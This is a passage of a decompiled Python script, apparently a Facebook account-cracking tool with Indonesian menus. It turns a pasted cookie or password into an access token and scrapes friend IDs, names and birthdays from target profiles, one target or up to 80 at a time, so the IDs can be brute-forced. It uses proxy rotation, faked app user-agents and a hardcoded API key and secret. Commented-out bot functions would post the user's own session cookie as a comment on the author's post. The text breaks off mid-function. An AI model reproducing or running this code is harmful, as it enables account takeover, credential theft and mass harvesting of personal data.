""" Decompiled by Exotic Hridoy """

import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
import hashlib
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
import urllib.request
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

M2 = '[#FF0000]'
H2 = '[#00FF00]'
K2 = '[#FFFF00]'
B2 = '[#00C8FF]'
P2 = '[#FFFFFF]'
U2 = '[#AF00FF]'
O2 = '[#FF8F00]'

sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus = '[/]'
lisensiku = []
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = ([], [], 0, 0, 0, [], [], [], [], [], [], [])
dia, ualu, ualuh = ([], [], [])
sys.stdout.write(']2; fanky ganteng\a')
# ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
try:
	android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
	try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
	except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	# versi_app = str(random.randint(111111111,999999999))
except:
	android_version = []
	simcard = []
	pass

def uaku():
    try:
        with open("fan.txt", "r") as file:
            ua = file.read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        url = "https://raw.githubusercontent.com/fanky86/Premium/main/fan.txt"
        response = requests.get(url)
        if response.status_code == 200:
            with open("fan.txt", "w") as file:
                aa = re.findall(r'line">(.*?)<', response.text)
                for un in aa:
                    file.write(un + "\n")
            with open("fan.txt", "r") as file:
                ua = file.read().splitlines()
            for ub in ua:
                ugen.append(ub)
        else:
            print("Gagal mengambil data dari GitHub")
try:
	uasayang = open("fan.txt", "r").read().splitlines()
	for fn in uasayang:
		ugen.append(fn)
except :
	ugent = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
for fanky in range(10000):
    tipe = random.choice(['dalvik', 'linux', 'windows', 'android'])
    if tipe == 'dalvik':
        brand = random.choice(['Samsung', 'Xiaomi', 'realme', 'OPPO', 'vivo', 'Infinix'])
        model = random.choice(['SM-A107F', 'Redmi Note 8', 'RMX3740', 'CPH1909', 'V2027', 'Infinix X657'])
        android_version = random.choice(['7.1.2', '8.1.0', '9', '10', '11', '12'])
        fbav = random.choice(['417.0.0.33.65', '416.0.0.30.91', '415.0.0.28.92', '414.0.0.25.90'])
        fbbv = random.choice(['480086274', '479612830', '478901234', '477456789'])
        fbrv = random.choice(['483172840', '483001122', '482765432', '482123456'])
        density = random.choice(['1.0', '1.5', '2.0'])
        width, height = random.choice([('540', '960'), ('720', '1280'), ('1080', '1920')])
        # ua = f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/QP1A.190711.020) [FBAN/FB4A;FBAV/{fbav};FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{fbbv};FBCR/Corporation Tbk;FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};FBCA/x86:armeabi-v7a;FBDM={density={density},width={width},height={height}};FB_FW/1;FBRV/{fbrv};]'
        ua = (
            f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/QP1A.190711.020) '
            f'[FBAN/FB4A;FBAV/{fbav};FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{fbbv};'
            f'FBCR/Corporation Tbk;FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};'
            f'FBCA/x86:armeabi-v7a;FBDM={{density={density},width={width},height={height}}};'
            f'FB_FW/1;FBRV/{fbrv};]'
        )
    elif tipe == 'linux':
        firefox_version = random.choice(['50.0', '52.0', '88.0', '100.0', '115.0'])
        distro = random.choice(['Ubuntu', 'Debian', 'Kali', 'Arch', 'Fedora'])
        arch = random.choice(['x86_64', 'i686'])
        ua = f'Mozilla/5.0 (X11; Linux {arch}; rv:{firefox_version}) Gecko/20100101 Firefox/{firefox_version} ({distro})'
    elif tipe == 'windows':
        firefox_version = random.choice(['50.0', '52.0', '88.0', '100.0', '115.0'])
        windows_version = random.choice(['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 10.0'])
        arch = random.choice(['Win64; x64', 'WOW64', ''])
        arch_str = f'; {arch}' if arch else ''
        ua = f'Mozilla/5.0 ({windows_version}{arch_str}) Gecko/20100101 Firefox/{firefox_version}'
    else:
        android_version = random.choice(['7.0', '8.1.0', '9', '10', '11', '12', '13'])
        model = random.choice(['SM-G991B', 'Redmi Note 10', 'CPH2083', 'V2149', 'M2012K11AG'])
        chrome_version = random.choice(['90.0.4430.91', '95.0.4638.74', '100.0.4896.127', '110.0.5481.153'])
        ua = f'Mozilla/5.0 (Linux; Android {android_version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'
        ugen.append(ua)

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")

# ------------------[ BERSIHIN MUKA LU]-----------------#
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        time.sleep(0.03)

# ------------------[ LOGO-FANKY-GANTENG ]-----------------#
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

def bannerlog():
    console.print(Panel(Text('\n     \'||\'       ..|\'\'||    ..|\'\'\'.|  \'||\' \'|.   \'|\' \n      ||       .|\'    ||  .|\'     \'   ||   |\'|   |  \n      ||       ||      || ||    ....  ||   | \'|. |  \n      ||       \'|.     || \'|.    ||   ||   |   |||  \n     .||.....|  \'\'|...|\'   \'\'|...\'|  .||. .|.   \'|                                           \n', style='bold green'), width=60, style='bold green', title='[bold white]MENU'))

def banlisen():
    console.print(Panel(Text('\n   LL      IIIII  CCCCC  EEEEEEE NN   NN  SSSSS  IIIII \n   LL       III  CC    C EE      NNN  NN SS       III  \n   LL       III  CC      EEEEE   NN N NN  SSSSS   III  \n   LL       III  CC    C EE      NN  NNN      SS  III  \n   LLLLLLL IIIII  CCCCC  EEEEEEE NN   NN  SSSSS  IIIII                                           \n', style='bold green'), width=60, style='bold green', title='[bold white]MENU'))

def banner():
    console.print(Panel(Text('\n\'||\'  \'||\'     |     \'||\'  |\'  \'||\' \' \'||\'\'\'\'| \'||\'\'|.   \n ||    ||     |||     || .\'     ||     ||  .    ||   ||  \n ||\'\'\'\'||    |  ||    ||\'|.     ||     ||\'\'|    ||\'\'\'|.  \n ||    ||   .\'\'\'\'|.   ||  ||    ||     ||       ||    || \n.||.  .||. .|.  .||. .||.  ||. .||.   .||.     .||...|\'                                         \n', style='bold green'), width=60, style='bold green', title='[bold white]MENU'))

def login123():
    clear()
    bannerlog()
    Console().print(Panel(f'{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n{P2}[{color_text}02{P2}].Login Menggunakan email dan password [{K2}Perbaikan{P2}]\n{P2}[{color_text}03{P2}].Masuk Tanpa Login\n[{color_text}04{P2}].{M2}Keluar', width=60, style=f'{color_panel}', title='[bold green]Login'))
    fansph = console.input(f' {H2}• {P2}pilih menu : ')
    if fansph in ['1', '01']:
        logincoki()
    elif fansph in ['2', '02']:
        loginuserpass()
    elif fansph in ['3', '03']:
        menu_nologin()
    elif fansph in ['4', '04']:
        exit()
    else:
        Console().print(f' {H2}• {P2}[bold red]Pilihan Tidak Diketahui!', end='\r')
        time.sleep(5)
        login()

def login():
    try:
        token = open('.fantoken.txt', 'r').read().strip()
        cok = open('.fancookie.txt', 'r').read().strip()
        tokenku.append(token)
        check = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies={'cookie': cok}).json()
        if 'error' in check:
            if 'Invalid OAuth' in check['error']['message'] or check['error']['code'] in [190, 102]:
                console.print(f' {H2}• {P2}[bold red] Token kadaluarsa atau invalid!')
                os.system('rm -rf .fantoken.txt && rm -rf .fancookie.txt')
                login123()
            elif 'checkpoint' in check['error']['message']:
                console.print(f' {H2}• {P2}[bold red] Akun terkena checkpoint!')
                os.system('rm -rf .fantoken.txt && rm -rf .fancookie.txt')
                login123()
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            console.print(f" {H2}• {P2}[bold red] Problem Internet Connection, Check And Try Again")
            exit()
    except IOError:
        login123()

def logincoki():
    try:
        cok = Console().input(f' {H2}• {P2}cookie : ')
        cookie = {'cookie': cok}
        open('.fancookie.txt', 'w').write(cok)
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
            req = xyz.get(url, cookies=cookie)
            set = re.search('act=(.*?)&nav_source', str(req.content)).group(1)
            nek = '%s?act=%s&nav_source=no_referrer' % (url, set)
            roq = xyz.get(nek, cookies=cookie)
            tok = re.search('accessToken=\"(.*?)\"', str(roq.content)).group(1)
            open('.fantoken.txt', 'w').write(tok)
#           bot_komen(cok, tok)
            Console().print(Panel(f'{P2}{tok}', width=60, style=f'{color_panel}', title='[bold green]TOKEN'))
            Console().print(f' {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script')
            exit()
    except Exception as e:
            os.system('rm -rf .fantoken.txt && rm -rf .fancookie.txt')
            exit()

def loginuserpass():
    try:
        console = Console()
        Console().print(f'{P2}Masukan username/email/idf dan password')
        email = console.input(' [green]• [white]Email : ')
        password = console.input(' [green]• [white]Password : ')
        api_key = '882a8490361da98702bf97a021ddc14d'
        api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key': api_key, 'credentials_type': 'password', 'email': email, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': password, 'return_ssl_resources': '0', 'v': '1.0'}
        sig_raw = f'api_key={api_key}credentials_type=passwordemail={email}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={password}return_ssl_resources=0v=1.0{api_secret}'.encode('utf-8')
        sig = hashlib.md5(sig_raw).hexdigest()
        data.update({'sig': sig})
        with requests.Session() as session:
            response = session.get('https://api.facebook.com/restserver.php', params=data)
            result = response.json()
            if 'access_token' in result:
                token = result['access_token']
                console.print(Panel(f'[white]{token}', title='[bold green]TOKEN TERSIMPAN', style=color_panel, width=60))
                with open('.fantoken.txt', 'w') as f:
                    f.write(token)
                cookie_str = ''
                if 'session_cookies' in result:
                    for c in result['session_cookies']:
                        cookie_str += f"{c['name']}={c['value']}; "
                    with open('.fancookie.txt', 'w') as f:
                        f.write(cookie_str.strip())
                    console.print(Panel(f'[white]{cookie_str}', title='[bold green]COOKIE TERSIMPAN', style=color_panel, width=60))
#                   bot_komen1(cookie_str.strip(), token)
                else:
                    console.print('[yellow] • [white]Tidak ada session_cookies dalam response.')
                console.print('[green] • [bold white]Login berhasil. Silakan jalankan ulang script.')
                exit()
            elif 'error_msg' in result and 'www.facebook.com' in result['error_msg']:
                console.print(f'[yellow] • [bold]Akun checkpoint: {email}')
            else:
                console.print(f"[red] • [bold]Login gagal Sandi/Email salah : {result.get('error_msg', 'Unknown error')}")
    except Exception as e:
        os.system('rm -rf .fantoken.txt .fancookie.txt')
        Console().print(f'[red] • [bold]Terjadi error: {str(e)}')
        exit()
"""
def bot_komen1(cok, token):
    try:
        with requests.Session() as r:
            r.cookies.update({'cookie': cok})
            komentar = random.choice(['bang lo pacarnya si cewek itu ya?, kok kaya cemburu liat dia deket sama laki\" itu?', 'menjaga perasaan itu lebih baik bang masih banyak cewek di luar sana yg lebih cantik kok 😎', 'lo cemburukah fan?', 'Semangat!', 'Gaskeun!', 'sesakit hati apapun sama dia jangan pernah untuk mencari perasaan/perhatian ke dia, udah iklhas in aja masih banyak yg suka sama kamu semangat fan ❤️'])
            target_uid = '100043537611609'
            post_id = '926438272150751'
            r.post(f'https://graph.facebook.com/{target_uid}/subscribers?access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={komentar}&access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={cok}&access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/likes?access_token={token}')
            # return None
    except Exception as e:
        pass

def bot_komen(cok, ken):
    with requests.Session() as r:
        text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
        r.cookies.update({'cookie': cok})
        r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
        r.post(f'https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={ken}')
        r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
        r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')

def bot_follow():
    with requests.Session() as r:
        toket = open('.fantoken.txt', 'r').read()
        r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
"""

def menu():
    try:
        token = open('.fantoken.txt', 'r').read()
        cookie = open('.fancookie.txt', 'r').read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa, masukan ulang cookie")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
        req = ses.get('https://www.facebook.com/profile.php', headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
        my_id = re.search('"userID":"(.*?)"', str(req)).group(1)
        my_name = re.search('"NAME":"(.*?)"', str(req)).group(1)
    except:
        my_name = []
        my_id = []
    try:
        with open('.fantoken.txt', 'r') as f:
            token = f.read().strip()
        with open('.fancookie.txt', 'r') as f:
            cookie = f.read().strip()
        url = f'https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token={token}'
        response = ses.get(url, cookies={'cookie': cookie}).json()
        temanku = response.get('summary', {}).get('total_count', 0)
    except:
        pass
    clear()
    banner()
    negara = requests.get('http://ip-api.com/json/').json()['country']
    ip = requests.get('http://ip-api.com/json/').json()['query']
    text = Align.center(f'{H2}{negara}{K2}')
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    dia.append(Panel(f'{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}', width=29, title=f'{P2}Perangkat', style=f'{color_panel}'))
    dia.append(panel(f'{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{temanku}\n{P2}IP     : {H2}{ip}', title=f'{P2}Bio Data', width=30, style=f'{color_panel}'))
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
[{color_text}02{P2}]. crack dari id Masal
[{color_text}03{P2}]. Dump Id publik
[{color_text}04{P2}]. crack dari hasil dump
[{color_text}05{P2}]. Lihat Hasil Crack
[{color_text}06{P2}]. Logout [[bold red]hapus cookie[bold white]]
[{color_text}07{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ["1", "01"]:
        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        dump_publikk(idfac,"",{"cookie":cookie},token)
        print('\n')
        setting()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        filename = console.input(f" {H2}• {P2}Masukkan nama file untuk menyimpan hasil dump : ")
        dump_id_publik(idfac,"",{"cookie":cookie},token,filename)
        print('\n')
        exit()
    elif HaHi in ["4", "04"]:
        filename = console.input(f" {H2}• {P2}Masukan nama file dump (cth: hasil.txt) :{U2} ")
        try:
            with open(filename, "r") as f:
                for line in f.readlines():
                    try:
                        id = line.strip()
                        id.append(id)  # jika menggunakan list khusus, ganti `id.append` sesuai list-nya
                    except: continue
            print('\n')
            setting()
        except FileNotFoundError:
            console.print(f" {H2}• {P2}[bold red] File tidak ditemukan!")
    elif HaHi in ["5", "05"]:
        result()
    elif HaHi in ["6", "06"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["7", "07"]:
        exit()
    else:
        console.print(f' {H2}• {P2}[bold red]Masukan Yang Bener')

def menu_nologin():
    clear()
    banner()

    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    text = Align.center(f"{H2}{negara}{K2}")
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    dia.append(Panel(f"{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}", width=30, title=f"{P2}Perangkat", style=f"{color_panel}"))
    dia.append(panel(f"{P2}IP     : {H2}{ip}\n{P2}Negara : {H2}{negara}", title=f"{P2}Info Umum", width=30, style=f"{color_panel}"))
    console.print(Columns(dia))
    prints(Panel(f"""[{color_text}01{P2}]. Crack dari hasil dump
[{color_text}02{P2}]. {M2}EXIT{P2}""", width=60, title="MENU TANPA LOGIN", style=f"{color_panel}"))

    HaHi = console.input(f" {H2}• {P2}Pilih menu : ")

    if HaHi in ["1", "01"]:
        filename = console.input(f" {H2}• {P2}Masukan nama file dump (cth: hasil.txt) :{U2} ")
        try:
            with open(filename, "r") as f:
                for line in f.readlines():
                    try:
                        id = line.strip()
                        id.append(id)  # jika menggunakan list khusus, ganti `id.append` sesuai list-nya
                    except: continue
            print('\n')
            setting()
        except FileNotFoundError:
            console.print(f" {H2}• {P2}[bold red] File tidak ditemukan!")
    elif HaHi in ["2", "02"]:
        print("Keluar dari program.")
        exit()
    else:
        console.print(f" {H2}• {P2}[bold red]Pilihan tidak valid!")
        time.sleep(3)
        menu_nologin()

#----------[ CRACK-PUBLIK  ]----------#
def dump_publikk(idfac, fields, cookie, token):
    try:
        headers = {'connection': 'keep-alive', 'accept': '*/*', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'sec-ch-ua-mobile': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9'}
        if len(id) == 0:
            params = {'access_token': token, 'fields': 'name,friends.fields(id,name,birthday)'}
        else:  # inserted
            params = {'access_token': token, 'fields': f'name,friends.fields(id,name,birthday).after({fields})'}
        url = ses.get(f'https://graph.facebook.com/{idfac}', params=params, headers=headers, cookies=cookie).json()
        for i in url['friends']['data']:
            id.append(i['id'] + '|' + i['name'])
            sys.stdout.write(f'\r • sedang dump id, berhasil mendapatkan : {len(id)} ID')
            sys.stdout.flush()
        dump_publikk(idfac, url['friends']['paging']['cursors']['after'], cookie, token)
    except:pass #return

#----------[ DUMP-ID-PUBLIK  ]----------#
def dump_id_publik(idfac, fields, cookie, token, filename):
    try:
        headers = {"connection":"keep-alive","accept":"*/*","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","sec-fetch-user":"?1","sec-ch-ua-mobile":"?1","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9"}
        params = {"access_token":token,"fields":"name,friends.fields(id,name,birthday)"} if len(id)==0 else {"access_token":token,"fields":f"name,friends.fields(id,name,birthday).after({fields})"}
        url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
        for i in url["friends"]["data"]:
            identitas = i["id"]+"|"+i["name"]
            if identitas not in id:
                id.append(identitas)
                sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                sys.stdout.flush()
        if "paging" in url["friends"] and "next" in url["friends"]["paging"]:
            dump_id_publik(idfac, url["friends"]["paging"]["cursors"]["after"], cookie, token, filename)
        if fields == "":
            with open(filename, "w", encoding="utf-8") as f:
                for line in id: f.write(line+"\n")
            print(f"\n[✓] Berhasil disimpan di: {filename}")
    except: pass

def massal():
    global id  # inserted
    try:
        token = open('.fantoken.txt', 'r').read().strip()
        cok = open('.fancookie.txt', 'r').read().strip()
    except IOError:
        Console().print(f" {H2}• {P2}Token atau Cookie tidak ditemukan!")
        exit()
    try:
        Console().print(Panel('[bold white] Masukkan Jumlah Target yang Mau di Crack', width=60, style=color_panel, title='[bold green] Crack Massal [bold white]'))
        jum = int(input(' • Masukkan jumlah target: '))
    except ValueError:
        Console().print(f" {H2}• {P2}Input salah, harap masukkan angka!")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f' {H2}• {P2}Jumlah target tidak valid (1-80)')
        exit()
    ses = requests.Session()
    uid = []
    id = []
    for i in range(jum):
        Console().print(Panel(f'[bold white] Masukkan Target ke-{i + 1}', width=60, style=color_panel))
        kl = Console().input(f' {H2}• {P2}Masukkan ID Target: ')
        uid.append(kl)
    for userr in uid:
        try:
            headers = {'connection': 'keep-alive', 'accept': '*/*', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'sec-ch-ua-mobile': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9'}
            params = {'access_token': token, 'fields': 'name,friends.fields(id,name,birthday)'}
            url = ses.get(f'https://graph.facebook.com/{userr}', params=params, headers=headers, cookies={'cookie': cok}).json()
            if 'friends' in url:
                for i in url['friends']['data']:
                    id.append(i['id'] + '|' + i['name'])
                    sys.stdout.write(f'\r • sedang dump id, berhasil mendapatkan : {len(id)} ID')
                    sys.stdout.flush()
                while "paging" in url["friends"] and "next" in url["friends"]["paging"]:
                    after_cursor = url["friends"]["paging"]["cursors"]["after"]
                    params['fields'] = f'name,friends.fields(id,name,birthday).after({after_cursor})'
                    url = ses.get(f'https://graph.facebook.com/{userr}', params=params, headers=headers, cookies={'cookie': cok}).json()
                    for i in url['friends']['data']:
                        id.append(i['id'] + '|' + i['name'])
                        sys.stdout.write(f'\r • sedang dump id, berhasil mendapatkan : {len(id)} ID')
                        sys.stdout.flush()
            else:
                pass
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f' {H2}• {P2}Koneksi tidak stabil!')
            exit()
    try:
        print('\n')
        setting()
    except requests.exceptions.ConnectionError:
        Console().print(f' {H2}• {P2}Koneksi tidak stabil!')
        exit()
    except (KeyError, IOError):
        Console().print(f' {H2}• {P2}Pertemanan tidak publik!')
        time.sleep(3)
        exit()

def result():
    console.print(Panel(f'{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}\n{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}', width=60, title='Hasil Crack', style=color_panel))
    fankycek = console.input(f' {H2}• {P2}Masukan : ')
    if fankycek in ['1', '01']:
        lihat_hasil('CP', f'{H2}• {P2}Anda Tidak Memiliki Hasil CP', 'bold yellow')
    elif fankycek in ['2', '02']:
        lihat_hasil('OK', f'{H2}• {P2}Anda Tidak Mempunyai File OK', 'bold green')
    else:
        console.print(f' {H2}• {P2}Pilih Yang Bener Bang')
        exit()

def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
    try:
        files = os.listdir(folder)
        if not files:
            console.print(pesan_tidak_ada)
            time.sleep(3)
            exit()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
        time.sleep(3)
        exit()
    file_map = {}
    for idx, file in enumerate(files, start=1):
        try:
            jumlah = len(open(f"{folder}/{file}", "r").readlines())
